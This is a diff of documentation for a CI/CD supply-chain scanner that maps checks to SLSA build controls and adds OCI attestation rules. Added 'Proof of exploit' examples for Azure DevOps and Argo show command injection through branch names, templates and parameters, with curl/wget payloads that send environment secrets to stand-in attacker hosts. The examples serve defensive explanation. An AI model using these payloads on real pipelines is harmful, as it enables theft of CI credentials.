@@ -20,7 +20,7 @@ the source-control side of the chain.
 
 - **Controls in this standard:** 7
 - **Controls evidenced by at least one check:** 6 / 7
-- **Distinct checks evidencing this standard:** 191
+- **Distinct checks evidencing this standard:** 200
 - **Of those, autofixable with `--fix`:** 64
 
 ## How to read severity
@@ -42,12 +42,12 @@ Click a control ID to jump to the per-control section with the full check list. 
 | Control | Title | Checks | Severity mix |
 |---------|-------|-------:|--------------|
 | [`Build.L1.Scripted`](#ctrl-build-l1-scripted) | Build L1: Build process is fully defined and automated (scripted build) | 0 | — |
-| [`Build.L1.Provenance`](#ctrl-build-l1-provenance) | Build L1: Provenance describing how the artifact was produced is generated | 29 | 1H · 24M · 4L |
-| [`Build.L2.Hosted`](#ctrl-build-l2-hosted) | Build L2: Builds run on a hosted build platform (not a developer workstation) | 6 | 6M |
-| [`Build.L2.Signed`](#ctrl-build-l2-signed) | Build L2: Provenance is authenticated and cannot be forged by tenants | 24 | 1H · 22M · 1L |
-| [`Build.L3.Isolated`](#ctrl-build-l3-isolated) | Build L3: Build runs in an isolated environment not influenced by other builds | 87 | 18C · 43H · 25M · 1L |
+| [`Build.L1.Provenance`](#ctrl-build-l1-provenance) | Build L1: Provenance describing how the artifact was produced is generated | 36 | 3H · 28M · 5L |
+| [`Build.L2.Hosted`](#ctrl-build-l2-hosted) | Build L2: Builds run on a hosted build platform (not a developer workstation) | 7 | 1H · 6M |
+| [`Build.L2.Signed`](#ctrl-build-l2-signed) | Build L2: Provenance is authenticated and cannot be forged by tenants | 26 | 3H · 22M · 1L |
+| [`Build.L3.Isolated`](#ctrl-build-l3-isolated) | Build L3: Build runs in an isolated environment not influenced by other builds | 88 | 18C · 44H · 25M · 1L |
 | [`Build.L3.Ephemeral`](#ctrl-build-l3-ephemeral) | Build L3: Build environment is ephemeral and provisioned fresh for each run | 18 | 14M · 4L |
-| [`Build.L3.NonFalsifiable`](#ctrl-build-l3-nonfalsifiable) | Build L3: Provenance cannot be falsified by the build's own tenant | 64 | 14C · 26H · 19M · 5L |
+| [`Build.L3.NonFalsifiable`](#ctrl-build-l3-nonfalsifiable) | Build L3: Provenance cannot be falsified by the build's own tenant | 68 | 14C · 29H · 20M · 5L |
 
 ## Filter at runtime
 
@@ -76,7 +76,7 @@ _No checks in this scanner currently evidence this control. Open an issue if you
 
 The build emits a signed statement describing how the artifact was produced (builder, source, parameters).
 
-**Evidenced by 29 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Helm, Jenkins, Tekton).
+**Evidenced by 36 checks** across 14 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Helm, Jenkins, OCI manifest, Tekton).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -84,6 +84,11 @@ The build emits a signed statement describing how the artifact was produced (bui
 | [`ADO-024`](#detail-ado-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
 | [`ARGO-010`](#detail-argo-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
 | [`ARGO-011`](#detail-argo-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
+| [`ATTEST-002`](#detail-attest-002) | SLSA provenance source-repo claim is missing or unverifiable | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-003`](#detail-attest-003) | SBOM contains floating-version dependencies | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-004`](#detail-attest-004) | SLSA provenance ships without a resolved-dependencies set | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-006`](#detail-attest-006) | SLSA provenance lacks a meaningful buildType | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-007`](#detail-attest-007) | SBOM packages lack supplier / originator attribution | <span class="pg-sev pg-sev--low">LOW</span> | [OCI manifest](../providers/oci.md) |  |
 | [`BB-007`](#detail-bb-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
 | [`BB-024`](#detail-bb-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
 | [`BK-010`](#detail-bk-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
@@ -107,6 +112,8 @@ The build emits a signed statement describing how the artifact was produced (bui
 | [`HELM-006`](#detail-helm-006) | Chart.yaml does not declare a kubeVersion compatibility range | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
 | [`JF-007`](#detail-jf-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
 | [`JF-028`](#detail-jf-028) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
+| [`OCI-001`](#detail-oci-001) | Image manifest is missing OCI provenance annotations | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
+| [`OCI-002`](#detail-oci-002) | Image is missing a build attestation manifest | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
 | [`TKN-010`](#detail-tkn-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |
 | [`TKN-011`](#detail-tkn-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |
 
@@ -114,11 +121,12 @@ The build emits a signed statement describing how the artifact was produced (bui
 
 Builds run on a managed build platform, not a developer workstation, so build identity and configuration are platform-controlled rather than user-controlled.
 
-**Evidenced by 6 checks** across 6 providers (Azure DevOps, Bitbucket, CircleCI, GitHub Actions, GitLab CI, Jenkins).
+**Evidenced by 7 checks** across 7 providers (Azure DevOps, Bitbucket, CircleCI, GitHub Actions, GitLab CI, Jenkins, OCI manifest).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
 | [`ADO-013`](#detail-ado-013) | Self-hosted pool without explicit ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
+| [`ATTEST-001`](#detail-attest-001) | SLSA provenance attests an untrusted builder identity | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
 | [`BB-016`](#detail-bb-016) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
 | [`CC-010`](#detail-cc-010) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
 | [`GHA-012`](#detail-gha-012) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
@@ -129,7 +137,7 @@ Builds run on a managed build platform, not a developer workstation, so build id
 
 Provenance is cryptographically signed by the build platform; tenants of the platform cannot forge it.
 
-**Evidenced by 24 checks** across 12 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Jenkins, Tekton).
+**Evidenced by 26 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Jenkins, OCI manifest, Tekton).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -137,6 +145,7 @@ Provenance is cryptographically signed by the build platform; tenants of the pla
 | [`ADO-024`](#detail-ado-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
 | [`ARGO-009`](#detail-argo-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
 | [`ARGO-011`](#detail-argo-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
+| [`ATTEST-005`](#detail-attest-005) | In-toto Statement subject is missing or unpinned | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
 | [`BB-006`](#detail-bb-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
 | [`BB-024`](#detail-bb-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
 | [`BK-009`](#detail-bk-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
@@ -155,6 +164,7 @@ Provenance is cryptographically signed by the build platform; tenants of the pla
 | [`GL-024`](#detail-gl-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
 | [`JF-006`](#detail-jf-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
 | [`JF-028`](#detail-jf-028) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
+| [`OCI-002`](#detail-oci-002) | Image is missing a build attestation manifest | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
 | [`TKN-009`](#detail-tkn-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |
 | [`TKN-011`](#detail-tkn-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |
 
@@ -162,7 +172,7 @@ Provenance is cryptographically signed by the build platform; tenants of the pla
 
 Each build runs in a fresh environment without influence from concurrent or previous builds. No shared mutable state.
 
-**Evidenced by 87 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Helm, Jenkins, Tekton).
+**Evidenced by 88 checks** across 14 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Helm, Jenkins, OCI manifest, Tekton).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -181,6 +191,7 @@ Each build runs in a fresh environment without influence from concurrent or prev
 | [`ARGO-004`](#detail-argo-004) | Argo workflow mounts hostPath or shares host namespaces | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) |  |
 | [`ARGO-005`](#detail-argo-005) | Argo input parameter interpolated unsafely in script / args | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) |  |
 | [`ARGO-008`](#detail-argo-008) | Argo script source pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
+| [`ATTEST-001`](#detail-attest-001) | SLSA provenance attests an untrusted builder identity | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
 | [`BB-002`](#detail-bb-002) | Script injection via attacker-controllable context | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
 | [`BB-010`](#detail-bb-010) | Deploy step ingests pull-request artifact unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
 | [`BB-012`](#detail-bb-012) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
@@ -285,7 +296,7 @@ Build environments are provisioned per run and torn down after, so a compromised
 
 The build platform's provenance signature is bound to inputs the tenant cannot influence (e.g. a backend-controlled identity), so a tenant-controlled compromise cannot mint forged provenance.
 
-**Evidenced by 64 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Helm, Jenkins, Tekton).
+**Evidenced by 68 checks** across 14 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Helm, Jenkins, OCI manifest, Tekton).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -299,6 +310,10 @@ The build platform's provenance signature is bound to inputs the tenant cannot i
 | [`ARGO-003`](#detail-argo-003) | Argo workflow uses the default ServiceAccount | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
 | [`ARGO-006`](#detail-argo-006) | Literal secret value in Argo template env or parameter default | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`ARGO-011`](#detail-argo-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
+| [`ATTEST-001`](#detail-attest-001) | SLSA provenance attests an untrusted builder identity | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-002`](#detail-attest-002) | SLSA provenance source-repo claim is missing or unverifiable | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-004`](#detail-attest-004) | SLSA provenance ships without a resolved-dependencies set | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-005`](#detail-attest-005) | In-toto Statement subject is missing or unpinned | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
 | [`BB-001`](#detail-bb-001) | pipe: action not pinned to exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`BB-008`](#detail-bb-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`BB-009`](#detail-bb-009) | pipe: pinned by version rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [Bitbucket](../providers/bitbucket.md) |  |
@@ -377,6 +392,41 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** `$(Build.SourceBranch*)`, `$(Build.SourceVersionMessage)`, and `$(System.PullRequest.*)` are populated from SCM event metadata the attacker controls. Inline interpolation into a script body executes crafted content.
 
 **Recommendation.** Pass these values through an intermediate pipeline variable declared with `readonly: true`, and reference that variable through an environment variable rather than `$(...)` macro interpolation. ADO expands `$(…)` before shell quoting, so inline use is never safe.
+
+**Proof of exploit.**
+
+# Vulnerable: PR title macro interpolated straight into script.
+trigger: none
+pr:
+  branches:
+    include: [main]
+jobs:
+  - job: triage
+    pool: { vmImage: ubuntu-latest }
+    steps:
+      - script: |
+          echo "New PR: $(System.PullRequest.SourceBranch)"
+          echo "Subject: $(Build.SourceVersionMessage)"
+
+# Attack: open a PR from a branch whose name carries shell:
+#
+#   git checkout -b 'foo";curl https://attacker/exfil \
+#     -d "$(printenv | base64)";echo "x'
+#
+# ADO expands ``$(...)`` BEFORE shell quoting, so the macro
+# value's `"` closes the echo and the rest becomes shell.
+# The PR-validated pipeline has the same service-connection
+# credentials a main-branch build would have, so the curl
+# exfils every secret in scope. Classic pwn-request shape.
+
+# Safe: route through env so the value is never interpolated
+# into the shell template.
+      - bash: |
+          echo "New PR: $PR_BRANCH"
+          echo "Subject: $COMMIT_MSG"
+        env:
+          PR_BRANCH: $(System.PullRequest.SourceBranch)
+          COMMIT_MSG: $(Build.SourceVersionMessage)
 
 **Source:** [`ADO-002`](../providers/azure.md#ado-002) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -524,6 +574,43 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Recommendation.** Pin the extends template to a protected repository ref (`template@ref`). Local templates in PR-validated pipelines can be poisoned by the PR author.
 
+**Proof of exploit.**
+
+# Vulnerable: PR-validated pipeline extends a LOCAL template.
+trigger: none
+pr:
+  branches: { include: [main] }
+extends:
+  template: templates/standard-build.yml   # no @repo ref
+
+# Attack: a PR author edits ``templates/standard-build.yml``
+# in their branch to inject any pipeline body they want.
+# The PR-validation run materializes the PR branch first,
+# THEN evaluates ``extends:`` against that tree, so the
+# attacker's template body runs with the pipeline's service
+# connections in scope.
+#
+# In the PR's templates/standard-build.yml:
+#   jobs:
+#     - job: exfil
+#       steps:
+#         - bash: |
+#             curl https://attacker.example/x \
+#               -d "$(printenv | base64 -w0)"
+#
+# No further trick needed, ``extends:`` is the gate and the
+# PR author controls what's behind it.
+
+# Safe: pin the template to a protected ref in a separate repo.
+resources:
+  repositories:
+    - repository: pipeline-templates
+      type: git
+      name: ProjectName/pipeline-templates
+      ref: refs/tags/v1.4.2     # immutable, signed tag
+extends:
+  template: templates/standard-build.yml@pipeline-templates
+
 **Source:** [`ADO-019`](../providers/azure.md#ado-019) in the [Azure DevOps provider](../providers/azure.md).
 
 #### `ADO-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-021 }
@@ -642,6 +729,54 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Recommendation.** Don't interpolate ``{{inputs.parameters.<name>}}`` directly into ``script.source`` or ``container.args``. Argo substitutes the value before the shell parses it, so a parameter containing ``; rm -rf /`` runs as shell. Pass the parameter via ``env:`` (``value: '{{inputs.parameters.<name>}}'``) and reference the env var quoted in the script (``"$NAME"``); or use ``inputs.artifacts`` for file payloads.
 
+**Known false positives.**
+
+- Parameters whose values are always controlled by trusted templates (a fixed enum, an internal SHA, an upstream service identifier the workflow generates itself) are safe to interpolate unquoted but the rule has no way to see the producer. Suppress per-template with ``--ignore-file`` once you've verified the parameter source can't reach a user. Quoted forms (``"{{inputs.parameters.X}}"``) are already excluded by the negative-lookbehind, so the typical safe pattern doesn't false-positive.
+
+**Proof of exploit.**
+
+# Vulnerable: webhook-triggered workflow interpolates a
+# user-supplied parameter directly into a shell script.
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+metadata: { generateName: greet- }
+spec:
+  entrypoint: main
+  arguments:
+    parameters:
+      - name: who
+  templates:
+    - name: main
+      inputs: { parameters: [ { name: who } ] }
+      script:
+        image: alpine:3.20
+        command: [sh]
+        source: |
+          echo Hello {{inputs.parameters.who}}
+
+# Attack: a webhook caller (or anyone with Submit on the
+# WorkflowTemplate) supplies a parameter carrying shell:
+#
+#   argo submit greet.yml -p who='x;wget -qO- attacker/exfil \
+#     -d "$(env|base64)";:'
+#
+# Argo substitutes the parameter BEFORE handing the source
+# to ``sh``, so the `;` ends the echo and the next command
+# runs. The pod inherits the workflow's ServiceAccount; if
+# that SA has any cluster privilege (mount, image-pull, kubectl)
+# the attacker now has it.
+
+# Safe: route through env so the shell only sees a quoted
+# expansion of a controlled-name variable.
+      script:
+        image: alpine:3.20
+        command: [sh]
+        env:
+          - name: WHO
+            value: '{{inputs.parameters.who}}'
+        source: |
+          echo "Hello $WHO"
+
 **Source:** [`ARGO-005`](../providers/argo.md#argo-005) in the [Argo Workflows provider](../providers/argo.md).
 
 #### `ARGO-006`: Literal secret value in Argo template env or parameter default <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-argo-006 }
@@ -708,6 +843,295 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Source:** [`ARGO-011`](../providers/argo.md#argo-011) in the [Argo Workflows provider](../providers/argo.md).
 
+#### `ATTEST-001`: SLSA provenance attests an untrusted builder identity <span class="pg-sev pg-sev--high">HIGH</span> { #detail-attest-001 }
+
+**Evidences:** [`Build.L2.Hosted`](#ctrl-build-l2-hosted) Build L2: Builds run on a hosted build platform (not a developer workstation), [`Build.L3.Isolated`](#ctrl-build-l3-isolated) Build L3: Build runs in an isolated environment not influenced by other builds, [`Build.L3.NonFalsifiable`](#ctrl-build-l3-nonfalsifiable) Build L3: Provenance cannot be falsified by the build's own tenant.
+
+**How this is detected.** Reads the SLSA provenance from each in-toto Statement carried in the image's attestation manifests, then checks ``predicate.builder.id`` (SLSA v0.2) / ``predicate.runDetails.builder.id`` (SLSA v1) against an allowlist of URI prefixes for hosted CI builders. Fires when the attested builder is unknown or matches a self-hosted-runner shape.
+
+Triggering this rule means the bytes of the runtime image were produced by a builder identity the SLSA contract cannot vouch for. A compromised self-hosted runner can produce a perfectly-formed, signature-valid attestation for a tampered image, so a passing OCI-002 (attestation present) is not the same thing as a trustworthy attestation, this rule is the difference.
+
+**Recommendation.** Re-run the build on a recognized hosted CI builder (GitHub-hosted runners, slsa-github-generator, Cloud Build, GitLab SaaS, Buildkite, or BuildKit attesting via Docker Hub) so the SLSA ``builder.id`` claim resolves to an isolated, publicly-auditable build environment. Self-hosted runners and unknown builder identities defeat the SLSA L2+ isolation guarantee, the supply-chain trust chain only extends as far as the *builder* the attestation names.
+
+**Known false positives.**
+
+- Some teams run their own SLSA-conformant builders for policy reasons (air-gapped builds, regulated workloads, FedRAMP environments). Add the builder's URI prefix to a future allowlist override (deferred to v2) or suppress via ignore-file when the team has a documented review of the builder's isolation posture.
+- Older BuildKit versions emitted a generic placeholder (``https://github.com/docker/buildx@v0.X``) without tying the identity to the runner. Modern Buildx writes a concrete builder URI; if the scan flags a placeholder, upgrade Buildx and rebuild before treating it as a real incident.
+
+**Seen in the wild.**
+
+- [SLSA threat-model v1.0](https://slsa.dev/spec/v1.0/threats): untrusted builder is the canonical Build-track Threat #2 ('Build the package from a modified source'). A tampered self-hosted runner can emit a syntactically-valid attestation for the wrong source.
+- [GitHub docs on self-hosted runner security](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security): non-ephemeral self-hosted runners default to persisted state between jobs; one compromised job gives the attacker arbitrary code execution that produces signed artifacts on every subsequent legitimate build on that runner. SLSA's isolation requirement (L2+) explicitly excludes this shape, which is why the rule treats ``self-hosted`` URIs as untrusted regardless of the rest of the chain.
+
+**Source:** [`ATTEST-001`](../providers/oci.md#attest-001) in the [OCI manifest provider](../providers/oci.md).
+
+#### `ATTEST-002`: SLSA provenance source-repo claim is missing or unverifiable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-attest-002 }
+
+**Evidences:** [`Build.L1.Provenance`](#ctrl-build-l1-provenance) Build L1: Provenance describing how the artifact was produced is generated, [`Build.L3.NonFalsifiable`](#ctrl-build-l3-nonfalsifiable) Build L3: Provenance cannot be falsified by the build's own tenant.
+
+**How this is detected.** The ``builder.id`` claim that ATTEST-001 verifies tells you *who* built the image. The source-repo claim ATTEST-002 verifies tells you *what* they built. Both are required for the SLSA chain to be meaningful: a trusted builder running an unknown source produces a signed attestation for code you can't audit.
+
+The rule walks the SLSA provenance predicate for a source URI. Path varies by spec version:
+  - v0.2: ``predicate.invocation.configSource.uri``
+  - v1.0: ``predicate.buildDefinition.externalParameters`` (builder-specific, commonly ``.workflow.repository`` or ``.source.uri``)
+Fires when:
+  - no URI is present anywhere on the expected paths;
+  - the URI is a known placeholder (empty, ``?``, ``unknown``, ``n/a``);
+  - the URI doesn't parse as a recognizable VCS / HTTPS shape;
+  - a URI is present but the corresponding digest field is missing or all-zeros (the bytes aren't actually pinned).
+
+**Recommendation.** Ensure the build emits SLSA provenance with a concrete source-repo URI plus a commit-level digest. For SLSA v0.2 that's ``predicate.invocation.configSource.uri`` + ``configSource.digest`` (typically ``sha1`` for git refs). For SLSA v1, ``predicate.buildDefinition.externalParameters`` should name the workflow's source repository, and ``predicate.buildDefinition.resolvedDependencies`` should include the same source pinned by digest. A missing or placeholder URI ('', 'unknown', 'n/a') leaves consumers unable to confirm what code produced the image.
+
+**Known false positives.**
+
+- Some SLSA Phase-0 attestations omit the digest field on purpose, the build was reproducible-by-source rather than pinned to a commit. Suppress via ignore-file when the team has documented this trade-off; the default expectation for any image promoted to a production registry is a concrete commit pin.
+- Builders that emit free-form ``externalParameters`` shapes (some self-hosted SLSA implementations) may carry the source URI under a non-canonical key. The rule walks every string value in ``externalParameters`` looking for a VCS URI; if none is found, the finding fires. Add the builder to a future allowlist override (deferred) when the shape is intentional.
+
+**Seen in the wild.**
+
+- [SLSA v1.0 threat model](https://slsa.dev/spec/v1.0/threats) (Source-track threats): a builder pulling code from a fork or a different ref than the operator believes produces an attestation that signs the wrong bytes. The source-track threats catalog those source-substitution shapes that a pinned + verified source claim mitigates.
+- [SolarWinds Orion compromise](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a) (December 2020): the build system pulled tampered source from an unauthorized branch via SUNSPOT, producing 'authentic' signed builds for code the development team never wrote. A pinned, verified source-repo claim is the control SLSA L2+ requires specifically to detect this shape.
+
+**Source:** [`ATTEST-002`](../providers/oci.md#attest-002) in the [OCI manifest provider](../providers/oci.md).
+
+#### `ATTEST-003`: SBOM contains floating-version dependencies <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-attest-003 }
+
+**Evidences:** [`Build.L1.Provenance`](#ctrl-build-l1-provenance) Build L1: Provenance describing how the artifact was produced is generated.
+
+**How this is detected.** ATTEST-001 verifies the builder; ATTEST-002 verifies the source; ATTEST-003 verifies the *contents* of what was shipped. A signed SBOM that declares ``openssl`` version ``latest`` is worse than no SBOM, the signature gives the rot a stamp of approval. Vulnerability-scanning tooling that reads the SBOM produces false negatives because the version it queries CVE databases for is unstable.
+
+Detection walks every SBOM attestation (predicate types starting with ``https://spdx.dev/Document`` or ``https://cyclonedx.org/bom``) and checks each declared package's version field against a floating-shape regex. A package is considered pinned when its version matches a concrete release identifier (semver, calver, sha-style digest, or any git tag with at least one numeric component).
+
+**Recommendation.** Pin every dependency in the SBOM to a concrete version (a released semver, a digest, or a tag-plus-commit pair). Floating values like ``latest``, ``*``, ``master``, an empty string, or a bare major like ``v1`` defeat the SBOM's purpose: a consumer can't reproduce or vulnerability-scan what they don't have a fixed version of. SPDX 2.x carries version under ``packages[*].versionInfo``; CycloneDX uses ``components[*].version``. Both fields are optional in the spec but operationally required for any meaningful SBOM consumption.
+
+**Known false positives.**
+
+- Some SBOM emitters legitimately leave ``versionInfo`` empty for system-injected components the build couldn't resolve (e.g. ``glibc`` from the base image when the image was built without distro metadata). Suppress via ignore-file scoped to the manifest path when the SBOM was produced in a context that intentionally elides those entries; for production-bound images the expectation is full version coverage.
+- Source-only components (a Git repo bundled into a builder stage) sometimes carry the branch name in version. Long-term that's still a floating reference (the branch tip moves), so the rule fires by design; switch to tag+digest pinning before suppressing.
+
+**Seen in the wild.**
+
+- [Log4Shell downstream impact](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a) (CVE-2021-44228): organizations with SBOMs at the ready could ship patches in hours; those without (or with floating-version SBOMs) spent days auditing builds to discover what they actually shipped. The ``log4j-core@latest`` shape was the worst case — the SBOM said the right name but no consumer could pin which exact bytes were in production.
+- Common SBOM-quality findings (NTIA SBOM Minimum Elements report, 2021): version completeness consistently the lowest-scoring dimension across producers. Floating versions account for the bulk of unconsumed SBOMs in vulnerability-management pipelines.
+
+**Source:** [`ATTEST-003`](../providers/oci.md#attest-003) in the [OCI manifest provider](../providers/oci.md).
+
+#### `ATTEST-004`: SLSA provenance ships without a resolved-dependencies set <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-attest-004 }
+
+**Evidences:** [`Build.L1.Provenance`](#ctrl-build-l1-provenance) Build L1: Provenance describing how the artifact was produced is generated, [`Build.L3.NonFalsifiable`](#ctrl-build-l3-nonfalsifiable) Build L3: Provenance cannot be falsified by the build's own tenant.
+
+**How this is detected.** Walks every SLSA provenance attestation on the image index and reads the materials list at the spec-version-appropriate path. Both v0.2 and v1 are accepted. A missing key, a non-list value, and an empty list all fail (each shape means the consumer gets no input chain-of-custody). Per-material content validation (digest map populated, URI well-formed) is deferred to a future rule, this one establishes that the list exists.
+
+Pairs with ATTEST-003: ATTEST-003 verifies the SBOM covers package-level inputs, ATTEST-004 verifies the build-level inputs. Both are needed for the SLSA Build-track L3 'isolated, reproducible' claim; SBOM-only coverage misses the resolved base image and the build-tool chain.
+
